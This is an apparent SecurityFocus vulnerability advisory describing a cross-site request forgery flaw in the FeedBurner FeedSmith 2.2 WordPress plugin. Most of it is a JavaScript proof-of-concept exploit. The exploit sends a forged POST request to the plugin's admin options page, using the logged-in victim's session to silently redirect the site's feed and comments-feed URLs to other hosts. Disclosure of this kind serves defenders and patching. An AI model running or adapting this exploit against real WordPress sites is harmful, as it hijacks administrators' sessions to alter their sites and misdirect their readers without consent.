source: http://www.securityfocus.com/bid/25921/info

FeedBurner FeedSmith is prone to a cross-site request-forgery vulnerability.

Exploiting this issue may allow a remote attacker to use a victim's currently active session to perform actions with the application.

This issue affects FeedBurner FeedSmith 2.2; other versions may also be affected. 

// Simple Proof of Concept Exploit for FeedSmith Feedburner CSRF Hijacking
// Tested on version 2.2.

t=&#039;http://www.example.com/wordpress/wp-admin/options-general.php?
    page=FeedBurner_FeedSmith_Plugin.php&#039;;

p=&#039;redirect=true&feedburner_url=http://www.example2.com/with/new/feed&
    feedburner_comments_url=http://www.example3.com/with/new/feed&#039;;

feedburner_csrf = function(t, p) {

        req = new XMLHttpRequest();
        var url = t;
        var params = p;
        req.open("POST", url);

        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        req.setRequestHeader("Content-length", params.length);
        req.setRequestHeader("Connection", "close");
        req.send(params);

};

feedburner_csrf(t,p);